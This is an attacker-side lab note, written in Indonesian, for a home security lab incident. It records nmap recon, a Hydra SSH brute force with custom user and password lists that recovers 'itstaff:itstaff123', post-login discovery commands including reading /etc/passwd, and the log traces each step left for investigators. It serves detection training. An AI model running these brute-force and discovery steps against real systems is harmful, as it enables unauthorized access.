# INC-002 - Attacker POV (Lab Reference)

> File ini adalah catatan proses build lab dari sisi attacker.
> Tidak masuk narasi investigator. Investigator POV ada di case-file/.

---

## Environment

- Attacker: Kali (192.168.30.200), user kalidhika
- Target: siemserver (192.168.30.50), port 22
- Tools: nmap 7.98, hydra v9.6, ssh

---

## Phase 1 - Recon

### Ping Sweep
```
nmap -sn 192.168.30.0/24
```
Timestamp: 2026-03-31 23:26 (Kali local time, UTC-4)

Result:
```
192.168.30.1    - up (VirtualBox gateway)
192.168.30.50   - up (SIEM target)
192.168.30.100  - up (DC01.lab.local)
192.168.30.101  - up (WKS01)
192.168.30.200  - up (Kali sendiri)
```

Screenshot: `recon-01-ping-sweep.png`

### Port Scan
```
nmap -sV -p 22 192.168.30.50
```
Timestamp: 2026-03-31 23:30 (Kali local time, UTC-4)

Result:
```
22/tcp open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
```

Screenshot: `recon-02-port-scan.png`

---

## Phase 2 - Brute Force

### Wordlist

**userlist-inc002.txt** (10 entries):
```
admin
administrator
root
itstaff
helpdesk
sysadmin
support
operator
netadmin
dhika
```

**wordlist-inc002.txt** (13 entries):
```
password
password123
admin123
itstaff
itstaff123
itstaff2024
itstaff2025
staff123
soc123456
soc78910
audit2026
Welcome1
P@ssw0rd
```

### Hydra Run

```
hydra -L /tmp/userlist-inc002.txt -P /tmp/wordlist-inc002.txt ssh://192.168.30.50 -t 4 -v 2>&1 | tee /tmp/hydra-inc002.txt
```

Timestamp start: 2026-04-01 00:14:02 (Kali local time, UTC-4)  
Timestamp finish: 2026-04-01 00:15:35 (Kali local time, UTC-4)  
= 2026-04-01 04:14:02 - 04:15:35 UTC  
= 2026-04-01 11:14:02 - 11:15:35 WIB

Total attempts: 130 (10 users x 13 passwords)  
Rate: ~94 tries/menit

Result:
```
[22][ssh] host: 192.168.30.50   login: itstaff   password: itstaff123
1 of 1 target successfully completed, 1 valid password found
```

Screenshot: `bruteforce-01-hydra-result.png`

### Catatan - Kenapa Ada Dua Successful Login di auth.log

Hydra dengan flag `-v` establish koneksi SSH dan authenticate saat menemukan password yang benar, tapi tidak langsung stop - dia tunggu child threads yang masih berjalan selesai. Selama itu sesi SSH yang pertama (`port 48808`) dibuka lalu langsung ditutup oleh Hydra sendiri setelah confirm password valid.

Login manual SSH setelahnya (port 36484) adalah sesi yang kedua - ini yang panjang ~10 menit.

Ini yang menyebabkan investigator melihat dua `Accepted password` di auth.log dalam window waktu berdekatan (04:14:30 dan 04:17:34 UTC).

---

## Phase 3 - Post-Compromise

### SSH Login Manual
```
ssh itstaff@192.168.30.50
```
Timestamp: 2026-04-01 04:17:34 UTC (11:17:34 WIB)

Screenshot: `access-01-ssh-login.png`

### Discovery Commands
```bash
date          # Wed Apr  1 04:23:14 AM UTC 2026
whoami        # itstaff
id            # uid=1001(itstaff) gid=1001(itstaff) groups=1001(itstaff)
uname -a      # Linux siemserver 5.15.0-173-generic
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home
ls -la /var/ossec/    # Permission denied
```

Output cat /etc/passwd (filtered):
```
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin/sync
dhika:x:1000:1000:dhika:/home/dhika:/bin/bash
itstaff:x:1001:1001::/home/itstaff:/bin/bash
socl1:x:1002:1002::/home/socl1:/bin/bash
socl2:x:1003:1003::/home/socl2:/bin/bash
audit:x:1004:1004::/home/audit:/bin/bash
```

Output ls -la /home:
```
drwxr-x--- 2 audit   audit   4096 Apr  1 02:19 audit
drwxr-x--- 5 dhika   dhika   4096 Apr  1 02:03 dhika
drwxr-x--- 3 itstaff itstaff 4096 Apr  1 03:36 itstaff
drwxr-x--- 2 socl1   socl1   4096 Apr  1 02:18 socl1
drwxr-x--- 2 socl2   socl2   4096 Apr  1 02:18 socl2
```

/var/ossec/ → Permission denied. itstaff tidak punya akses ke directory Wazuh.

Screenshot: `discovery-01-recon-commands.png`

### Logout
Timestamp: 2026-04-01 04:28:11 UTC (11:28:11 WIB)

---

## Catatan Lab

### Mengapa itstaff123 Berhasil Di-crack
Password `itstaff123` memenuhi format `namauser + angka` yang dimasukkan ke wordlist secara manual. Di real environment, password seperti ini sangat umum dan ada di hampir semua wordlist standard.

### Mengapa Tidak Ada bash_history
`~/.bash_history` tidak ada saat dicek di akhir sesi. bash baru menulis history ke disk saat sesi ditutup secara normal, dan file baru terbentuk setelah sesi pertama selesai. Karena ini sesi pertama itstaff, file belum ada saat dicek.

### Hydra Run Pertama (Pakai -V)
Sebelum run yang terdokumentasi di atas, ada satu run Hydra dengan flag `-V` (verbose semua attempt). Run ini yang menyebabkan btmp punya entries mulai 03:35:57 UTC - sekitar 40 menit sebelum alert Wazuh pertama. Run ini tidak disimpan outputnya karena terlalu panjang, diganti dengan run `-v` yang lebih clean.

---

## Screenshots

| File | Isi |
|------|-----|
| recon-01-ping-sweep.png | Nmap ping sweep 192.168.30.0/24 |
| recon-02-port-scan.png | Nmap port scan port 22, OpenSSH 8.9p1 |
| bruteforce-01-hydra-result.png | Hydra result - itstaff:itstaff123 found |
| access-01-ssh-login.png | SSH login berhasil sebagai itstaff |
| discovery-01-recon-commands.png | Discovery commands output |
